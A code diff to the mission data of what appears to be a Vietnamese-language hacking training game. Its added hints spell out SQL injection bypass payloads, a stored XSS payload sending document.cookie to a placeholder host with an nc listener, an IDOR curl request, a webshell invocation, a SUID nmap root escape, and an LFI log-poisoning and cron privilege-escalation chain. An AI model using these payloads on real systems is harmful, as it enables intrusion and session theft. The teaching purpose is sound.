@@ -94,7 +94,7 @@ export const missions = {
       hints: [
         'Mày cần search toàn bộ filesystem theo phần mở rộng file.',
         'Dùng `find / -name "*.conf"` để tìm tất cả file .conf.',
-        'Gõ `find / -name "*.conf"` rồi `cat <đường-dẫn-tìm-được>` để xem nội dung.',
+        'Gõ `find / -name "*.conf"` rồi `cat /opt/app/app.conf` (một file tìm được) để xem nội dung.',
       ],
       terms: [
         { term: 'find', def: 'Tìm file/thư mục theo điều kiện trong cả cây thư mục.' },
@@ -560,7 +560,7 @@ export const missions = {
         { id: 'bypass', description: 'Bypass authentication, đăng nhập mà không cần password', match: /('|")?\s*or\s+('|")?1('|")?\s*=\s*('|")?1|or\s+1=1|admin'\s*--/i, output: 'Query: ...WHERE username=\'admin\' OR \'1\'=\'1\' -- \'  => returns the admin row. Welcome admin! (logged in without a password)' },
       ],
       hints: [
-        'Câu query nối thẳng input, nghĩa là mày có thể chèn điều kiện luôn đúng.',
+        'Đọc source bằng `cat /var/www/html/login.php` — query nối thẳng input nghĩa là mày có thể chèn điều kiện luôn đúng.',
         'Thử payload làm mệnh đề password luôn true, ví dụ `\' OR \'1\'=\'1`.',
         "Nhập username `admin' -- ` (có dấu cách sau --) để comment phần password đi, hoặc `' OR 1=1 -- ` để bypass.",
       ],
@@ -583,7 +583,7 @@ export const missions = {
         { id: 'inject_payload', description: 'Inject payload gửi cookie admin về server của mày', match: /<script>.*document\.cookie|fetch\(.*document\.cookie|onerror=/i, output: 'Comment stored. When the admin opens the page, their browser runs the script and sends the cookie to your listener: PHPSESSID=ad12cef9b... (admin session hijacked).' },
       ],
       hints: [
-        'Comment được lưu và render lại cho mọi người -> stored XSS.',
+        'Đọc `cat /var/www/html/comments.php` thấy comment được lưu và render lại không escape -> stored XSS.',
         'Inject thẻ script gửi `document.cookie` về listener của mày.',
         "Post comment: `<script>fetch('http://MY_IP/c?'+document.cookie)</script>` rồi mở listener (vd `nc -lvnp 80`) chờ admin xem.",
       ],
@@ -606,7 +606,7 @@ export const missions = {
         { id: 'exploit_idor', description: 'Đổi id để truy cập data user khác (admin id=1)', match: /(curl|wget|http)\b.*\/api\/user\/1\b/, output: '{"id":1,"username":"admin","role":"superadmin","email":"admin@acme-corp.com","api_key":"sk_live_9fA2..."}  <- read another user\'s data (admin, id=1) via IDOR' },
       ],
       hints: [
-        'id nằm thẳng trong URL và server không check chủ sở hữu.',
+        'Đọc `cat /home/hacker/api-docs.txt` thấy id nằm thẳng trong URL và server không check chủ sở hữu.',
         'Gửi request tới `/api/user/1` thay vì id của mày.',
         'Gõ `curl -H "Authorization: Bearer <token>" http://target/api/user/1` để đọc data admin.',
       ],
@@ -748,7 +748,7 @@ export const missions = {
       ],
       hints: [
         'Black-box, tự khám phá là chính. Nếu bí: thử các service mở port phổ biến trước, có dịch vụ nào cho login không cần mật khẩu không?',
-        'Login `ftp 10.10.10.35` (user anonymous), tìm thư mục upload web ghi được, đẩy 1 webshell vào rồi gọi qua web.',
+        'Login `ftp 10.10.10.35` (user anonymous), tìm thư mục upload web ghi được, đẩy webshell vào rồi gọi `curl http://10.10.10.35/uploads/shell.php?cmd=id`.',
         'Từ www-data dùng SUID nmap: `nmap --interactive` rồi `!sh` (GTFOBins) để thành root, `cat /root/flag.txt` -> FLAG{ftp_upload_rce_suid_nmap}.',
       ],
       terms: [
@@ -773,7 +773,7 @@ export const missions = {
       ],
       hints: [
         'Bài cuối — tự lực là chính, dùng hint càng ít càng tốt. Gợi ý duy nhất ở cấp này: domain chính chưa chắc là nơi có lỗ hổng, mày có chắc đã thấy hết bề mặt tấn công chưa?',
-        'Sau khi tìm được subdomain/endpoint chứa lỗ hổng: để ý tham số load nội dung trang (kiểu `?page=`) và log truy cập web server — 2 thứ này có thể kết hợp với nhau.',
+        'Enumerate subdomain trước: `subfinder -d mega-corp.com`. Sau khi tìm endpoint chứa lỗ hổng: để ý tham số load nội dung trang (kiểu `?page=`) và log truy cập web server — 2 thứ này có thể kết hợp với nhau.',
         'LFI include `/var/log/apache2/access.log`, inject PHP vào User-Agent để log poisoning lấy RCE thành www-data; sau đó cron root chạy world-writable `/opt/maint/run.sh` — append `cp /bin/bash /tmp/rb && chmod +s /tmp/rb`, đợi cron, `/tmp/rb -p`, rồi `cat /root/flag.txt` -> FLAG{full_chain_lfi_logpoison_cron_root}.',
       ],
       terms: [
